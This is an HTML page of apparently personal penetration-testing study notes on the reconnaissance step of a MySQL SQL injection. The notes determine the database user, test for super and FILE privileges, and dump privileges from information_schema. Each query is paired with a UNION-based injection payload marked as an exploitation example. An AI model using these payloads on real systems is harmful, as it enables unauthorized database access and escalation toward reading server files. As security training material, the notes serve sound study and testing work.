<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Gathering Informations</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Gathering Informations</h1><br/>Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation<br /><br /><br /><br /><strong><h3>DB User: Determine which user we are within the database</h3></strong><br />To read data we do not necessarily need database administrator (DBA) privileges, but this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. <br />If we have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. <br /><br />• To find our current DB user<br /><div class="codebox"><pre>SELECT USER()<br />SELECT CURRENT_USER()<br />SELECT user from mysql.user</pre></div><br /><span style="color:#a52a2a;">examples of how to use these queries during exploitation:</span><br />    <div class="codebox"><pre>input&#39; UNION SELECT 1, user(), 3, 4-- -<br /></pre></div><br />    <a href=""><img src="images/2513-1.png" alt="images/2513-1.png" /></a><br />    <div class="codebox"><pre>input&#39; UNION SELECT 1, user, 3, 4 from mysql.user-- -</pre></div><br />    <a href=""><img src="images/2513-2.png" alt="images/2513-2.png" /></a><br />    <br /><br /><strong><h3>User Privileges: Privileges that we have with the DB User</h3></strong><br />• To test if we have super admin privileges<br /><div class="codebox"><pre>SELECT super_priv FROM mysql.user</pre></div><br />    &#39;Y&#39; as response means YES<br /><span style="color:#a52a2a;">examples of how to use these queries during exploitation:</span><br />    <div class="codebox"><pre>input&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -</pre></div><br />    <a href=""><img src="images/2513-3.png" alt="images/2513-3.png" /></a><br />    to show the privileges only for a specific user:<br />    <div class="codebox"><pre>input&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</pre></div><br /><br />• To dump current user privileges from the schema<br /><div class="codebox"><pre>SELECT grantee, privilege_type FROM information_schema.user_privileges</pre></div><br /><span style="color:#a52a2a;">examples of how to use these queries during exploitation:</span><br />    <div class="codebox"><pre>input&#39; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -</pre></div><br />    <a href=""><img src="images/2513-4.png" alt="images/2513-4.png" /></a><br />    We have <strong><span style="color:#ffa500;">FILE</span></strong> privilege!<br />    <br /></div>
</body>
</html>
